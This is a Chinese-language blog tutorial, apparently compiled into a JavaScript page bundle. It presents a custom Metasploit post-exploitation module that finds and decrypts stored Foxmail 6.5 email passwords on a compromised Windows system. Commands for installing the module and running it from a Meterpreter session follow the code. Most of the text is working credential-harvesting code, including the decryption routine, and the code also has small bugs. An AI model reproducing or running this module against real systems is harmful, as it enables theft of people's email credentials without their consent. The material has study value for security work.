(window.webpackJsonp=window.webpackJsonp||[]).push([[342],{638:function(s,n,a){"use strict";a.r(n);var e=a(7),t=Object(e.a)({},(function(){var s=this,n=s._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"metasploit自定义收集登录凭证的后渗透模块"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#metasploit自定义收集登录凭证的后渗透模块"}},[s._v("#")]),s._v(" Metasploit自定义收集登录凭证的后渗透模块")]),s._v(" "),n("p",[s._v("这里，我们以攻击Foxmail 6.5为例，将尝试对登录凭证进行解密，然后将它保存到数据库。")]),s._v(" "),n("p",[n("strong",[s._v("注意：运行这个脚本的前提是我们已经经过一系列的渗透拿下了目标Windows系统的System权限。")])]),s._v(" "),n("p",[s._v("这里，我们编写脚本foxmail_decrypt_by_binghe.rb，内容如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('##\n# Author 冰河\n# Date 2019-01-13\n# Description 对foxmail 6.5的登录凭证进行解密\n#\n# 实现过程如下：\n# 1.搜索用户的文件，查找当前用户的LocalAppData文件夹的准确位置\n# 2.使用上面找到的文职，并将其与\\VirtualStore\\Program Files(x86)\\Tencent\\Foxmail\\mail连接，建立一个mail文件夹的完整路径\n# 3.列出mail文件夹下的所有文件夹，并将它们都保存到一个数组中。在mail文件夹中的每一个文件夹的名字都对应着一个邮箱用户名，比如binghe@formail.com就可以是mail文件夹下的一个文件夹\n# 4.在mail文件夹下的accounts文件中查找Account.stg文件\n# 5.通过读取Account.stg文件，会发现名为POP3Password的哈希\n# 6.将这个值传递给解密方法，然后就会得到明文密码\n# 7.将这些值保存到数据库\n##\n\nrequire \'msf/core\'\n\nclass Metasploit3 < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n  \n  def initialize(info={})\n    super(update_info(info,\n      \'Name\'          => \'Foxmail 6.5 Credential Harvester\',\n      \'Description\'   => %q{\n          This module Finds and Decrypts Stored Foxmail 6.5 Credentials\n       },\n       \'License\'      => MSF_LICENSE,\n       \'Author\'       => [\'binghe\'],\n       \'Platform\'     => [\'Windows\'],\n       \'SessionTypes\' => [\'Meterpreter\']\n    ))\n    end\n    \n    #程序入口\n    def run\n      profile = grap_user_profiles()\n      counter = 0\n      data_entry = ""\n      profile.each do |user|\n        if user[\'LocalAppData\']\n          full_path = user[\'LocalAppData\']\n          full_path = full_path + "\\\\VirtualStore\\\\Program Files(x86)\\\\Tencent\\\\Foxmail\\\\mail"\n          if directory?(full_path)\n            print_good("Fox Mail Installed, Enumerating Mail Accounts")\n            session.fs.dir.foreach(full_path) do |dir_list|\n            if dir_list = ~/@/\n              counter = counter + 1\n              full_path_mail = full_path + "" + dir_list + "" + "Account.stg"\n              if file?(full_path_mail)\n                print_good("Reading Mail Account #{counter}")\n                file_content = read_file(full_path_mail).split("\\n")\n                file_content.each do |hash|\n                if hash = ~/POP3Password/\n                  hash_data = hash.split("=")\n                  hash_value = hash[1]\n                  if hash_value.nil?\n                    print_error("No Saved Password")\n                  else\n                    print_good("Decrypting Password for mail account: #{dir_list}")\n                    #调用解密方法进行解密\n                    decrypted_pass = decrypt(hash_value, dir_list)\n                    data_entry << "Username:" + dir_list + "\\t" + "Password:" + decrypted_pass + "\\n"\n                  end\n                 end\n                end\n               end\n              end\n             end\n            end\n           end\n          end\n          store_loot("Foxmail Accounts", "text/plain", session, data_entry, "Fox.txt", "Fox Mail Accounts") \n      end  \n      \n      #解密方法\n      def decrypt(hash_real, dir_list)\n        decoded = ""\n        magic = Array[126,100,114,97,71,111,110,126]\n        fc0 = 90\n        size = (hash_real.length) / 2 - 1\n        index = 0\n        b = Array.new(size)\n        for i in 0 .. size do\n         b[i] = (hash_real[index, 2]).hex\n         index = index + 2\n        end\n        b[0] = b[0] ^ fc0\n        double_magic = magic + magic\n        d = Array.new(b.length - 1)\n        for i in 1 .. b.length - 1 do\n          d[i-1] = b[i] ^ double_magic[i - 1]\n        end\n        \n        e = Array.new(d.length)\n        for i in 0 .. (d.length -1)\n          if(d[i] - b[i] < 0)\n            e[i] = d[i] + 255 - b[i]\n           else\n            e[i] = d[i] - b[i]\n           end\n           decoded << e[i].chr\n         end\n         print_good("Found Username #{dir_list} with Password: #{decoded}")\n         return decoded\n       end\nend\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br"),n("span",{staticClass:"line-number"},[s._v("78")]),n("br"),n("span",{staticClass:"line-number"},[s._v("79")]),n("br"),n("span",{staticClass:"line-number"},[s._v("80")]),n("br"),n("span",{staticClass:"line-number"},[s._v("81")]),n("br"),n("span",{staticClass:"line-number"},[s._v("82")]),n("br"),n("span",{staticClass:"line-number"},[s._v("83")]),n("br"),n("span",{staticClass:"line-number"},[s._v("84")]),n("br"),n("span",{staticClass:"line-number"},[s._v("85")]),n("br"),n("span",{staticClass:"line-number"},[s._v("86")]),n("br"),n("span",{staticClass:"line-number"},[s._v("87")]),n("br"),n("span",{staticClass:"line-number"},[s._v("88")]),n("br"),n("span",{staticClass:"line-number"},[s._v("89")]),n("br"),n("span",{staticClass:"line-number"},[s._v("90")]),n("br"),n("span",{staticClass:"line-number"},[s._v("91")]),n("br"),n("span",{staticClass:"line-number"},[s._v("92")]),n("br"),n("span",{staticClass:"line-number"},[s._v("93")]),n("br"),n("span",{staticClass:"line-number"},[s._v("94")]),n("br"),n("span",{staticClass:"line-number"},[s._v("95")]),n("br"),n("span",{staticClass:"line-number"},[s._v("96")]),n("br"),n("span",{staticClass:"line-number"},[s._v("97")]),n("br"),n("span",{staticClass:"line-number"},[s._v("98")]),n("br"),n("span",{staticClass:"line-number"},[s._v("99")]),n("br"),n("span",{staticClass:"line-number"},[s._v("100")]),n("br"),n("span",{staticClass:"line-number"},[s._v("101")]),n("br"),n("span",{staticClass:"line-number"},[s._v("102")]),n("br"),n("span",{staticClass:"line-number"},[s._v("103")]),n("br"),n("span",{staticClass:"line-number"},[s._v("104")]),n("br"),n("span",{staticClass:"line-number"},[s._v("105")]),n("br"),n("span",{staticClass:"line-number"},[s._v("106")]),n("br"),n("span",{staticClass:"line-number"},[s._v("107")]),n("br"),n("span",{staticClass:"line-number"},[s._v("108")]),n("br"),n("span",{staticClass:"line-number"},[s._v("109")]),n("br")])]),n("p",[s._v("然后我们将foxmail_decrypt_by_binghe.rb脚本上传到Kali的/usr/share/metasploit-framework/modules/post/windows/gather/credentials目录下。")]),s._v(" "),n("p",[s._v("在运行这个脚本之前，我们先使用Metasploit中的msftidy工具检查一下此脚本的语法是否正确。")]),s._v(" "),n("p",[s._v("在Kali的命令行执行如下命令：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("/usr/share/metasploit-framework/tools/dev/msftidy.rb /usr/share/metasploit-framework/modules/post/windows/gather/credentials/foxmail_decrypt_by_binghe.rb\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("未输出任何信息，证明脚本正确。")]),s._v(" "),n("p",[s._v("接下来，我们的Kali命令行，执行如下命令：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("meterpreter > background\nmsf > set SESSION 1\nmsf > use post/windows/gather/credentials/foxmail_decrypt_by_binghe \nmsf post(windows/gather/credentials/foxmail_decrypt_by_binghe) > show options\n\nModule options (post/windows/gather/credentials/foxmail_decrypt_by_binghe):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION                   yes       The session to run this module on.\n\nmsf post(windows/gather/credentials/foxmail_decrypt_by_binghe) > run\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br")])]),n("h2",{attrs:{id:"写在最后"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),n("blockquote",[n("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);n.default=t.exports}}]);